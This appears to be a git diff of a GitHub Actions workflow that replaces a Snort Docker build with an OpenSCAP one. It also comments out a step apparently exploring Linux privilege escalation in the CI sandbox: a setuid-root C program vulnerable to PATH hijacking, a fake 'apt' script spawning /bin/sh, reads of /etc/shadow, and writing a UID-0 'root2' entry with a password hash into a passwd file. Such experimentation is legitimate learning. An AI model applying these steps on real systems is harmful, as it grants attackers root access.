@@ -26,57 +26,57 @@ jobs:
         cat /etc/issue
         cat /etc/os-release
         sudo apt-get install -y neofetch && neofetch 
-    # - name: "docker build fedora snort"
-    #   run: |
-    #     # destroyed afterwards (use --rm )
-    #     # all subsequent Dockerfile commands generate new images and the cache is not used
-    #     sudo docker build --no-cache --rm  -t ${name} . --file dockerfiles/${dockerfilename}  
-    #     docker image ls
-    #     docker image history ${name}
-    #     docker system df -v               
-    #     docker image inspect ${name}     
-    - name: "docker build fedora snort"
+    - name: "docker build fedora openscap"
       run: |
         # destroyed afterwards (use --rm )
         # all subsequent Dockerfile commands generate new images and the cache is not used
-        ls -lai
-        # executed as root (Uid 0)
-        stat /usr/bin/passwd
-        ls -lai /usr/bin/passwd
-        stat /etc/shadow
-        ls -lai /etc/shadow
-        # Finding vulnerable executables,files with setuid bit set
-        # sudo find / -xdev -perm -4000 2>/dev/null
-        #Path injection
-        #when an executable refer to another one without using the full path to
-        cat <<EOT | sudo tee apt-updater.c
-        #include <stdlib.h>
-        #include <unistd.h>
+        sudo docker build --no-cache --rm  -t ${name} . --file dockerfiles/${dockerfilename}  
+        docker image ls
+        docker image history ${name}
+        docker system df -v               
+        docker image inspect ${name}     
+    - name: "docker build simple exploits"
+    #   run: |
+    #     # destroyed afterwards (use --rm )
+    #     # all subsequent Dockerfile commands generate new images and the cache is not used
+    #     ls -lai
+    #     # executed as root (Uid 0)
+    #     stat /usr/bin/passwd
+    #     ls -lai /usr/bin/passwd
+    #     stat /etc/shadow
+    #     ls -lai /etc/shadow
+    #     # Finding vulnerable executables,files with setuid bit set
+    #     # sudo find / -xdev -perm -4000 2>/dev/null
+    #     #Path injection
+    #     #when an executable refer to another one without using the full path to
+    #     cat <<EOT | sudo tee apt-updater.c
+    #     #include <stdlib.h>
+    #     #include <unistd.h>
 
-        int main() {
-          setuid(0);
+    #     int main() {
+    #       setuid(0);
 
-          system("apt update");
-          system("apt upgrade -y");
-          return 0;
-        }
-        EOT
-        stat apt-updater.c
-        ls -lai apt-updater.c
-        mkdir /tmp/foo # create random directory to put the script
-        echo /bin/sh > /tmp/foo/apt # create the script that will launch /bin/sh
-        chmod 755 /tmp/foo/apt # mark it as executable
-        # override the PATH variable to that it contains /tmp/foo directory 
-        # & execute the vulnerable program
-        # PATH=/tmp/foo:$PATH /usr/local/bin/apt-updater 
-        whoami
-        id # root?
-        # echo “runner::0:0:System Administrator:/root/root:/bin/bash” | sudo tee /etc/passwd
-        id
-        mkdir source
-        cp /etc/passwd source/passwd
-        useradd root2
-        id root2
-        echo 'root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' | sudo tee source/passwd
-        ln -s /etc destination
-        su root2
+    #       system("apt update");
+    #       system("apt upgrade -y");
+    #       return 0;
+    #     }
+    #     EOT
+    #     stat apt-updater.c
+    #     ls -lai apt-updater.c
+    #     mkdir /tmp/foo # create random directory to put the script
+    #     echo /bin/sh > /tmp/foo/apt # create the script that will launch /bin/sh
+    #     chmod 755 /tmp/foo/apt # mark it as executable
+    #     # override the PATH variable to that it contains /tmp/foo directory 
+    #     # & execute the vulnerable program
+    #     # PATH=/tmp/foo:$PATH /usr/local/bin/apt-updater 
+    #     whoami
+    #     id # root?
+    #     # echo “runner::0:0:System Administrator:/root/root:/bin/bash” | sudo tee /etc/passwd
+    #     id
+    #     mkdir source
+    #     cp /etc/passwd source/passwd
+    #     useradd root2
+    #     id root2
+    #     echo 'root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' | sudo tee source/passwd
+    #     ln -s /etc destination
+    #     su root2
